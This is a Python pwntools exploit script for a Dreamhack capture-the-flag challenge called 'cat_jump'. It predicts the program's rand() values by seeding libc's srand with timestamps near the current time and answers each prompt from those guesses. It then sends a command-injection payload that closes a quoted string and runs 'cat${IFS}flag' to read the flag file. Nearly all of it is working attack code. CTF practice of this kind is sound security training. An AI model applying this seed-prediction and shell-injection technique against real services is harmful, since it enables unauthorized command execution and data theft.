from pwn import *
from ctypes import CDLL
import time

elf = ELF('/home/kali/Downloads/dreamhack/catjump/deploy/cat_jump')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:11082'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript="""
#brva 0x1377
#brva 0x141d
#""")

#c code
libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
now = int(time.time())

i=11
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    	random_seed = seed
    
    j=j+1
    
    
#save the seed at now + i

libc.srand(random_seed)

def predict():
    while(True):
        try:
            data = p.recvuntil(b": ")
            print(data)
            if b"reached the roof" in data:
                break
            v5 = libc.rand()
            print(f"v5 random: {v5}")
            #v5 impar -> send 'h'
            #v5 par -> send 'l'
            if v5 %2 == 0:
                p.sendline(b"l")
            else:
                p.sendline(b"h")
            #now call rand again for v6
            v6 = libc.rand()
            print(f"v6 random: {v6}")
            sleep(1)
        except:
            print("idfk")
            p.interactive()
    

predict()
#now for the last part; 
#close the str, insert payload, then open again
p.sendline(b'a\";cat${IFS}flag;echo${IFS}\"b')
p.interactive()
